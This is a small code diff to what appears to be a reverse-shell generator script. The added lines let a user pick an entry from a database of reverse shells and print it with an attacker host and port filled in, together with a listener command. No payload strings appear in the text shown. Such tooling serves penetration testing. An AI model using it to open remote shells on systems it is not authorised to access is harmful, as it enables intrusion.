@@ -35,3 +35,10 @@ if __name__ == "__main__":
         for revshell in db:
             print(f'''{revshell["uniqueID"]} > {revshell["name"]}''')
 
+        choice  = int(input("> "))
+        if choice <= len(db):
+            for revshell in db:
+                if choice == revshell["uniqueID"]:
+                    print(f'\nReverse shell:\n{revshell["reverseShell"].replace("ATTACKER_IP", str(args.host)).replace("ATTACKER_PORT", str(args.port))}\nListener:\n{revshell["listener"].replace("ATTACKER_PORT", str(args.port))}\n')
+        else: print("Insert a valid number")
+
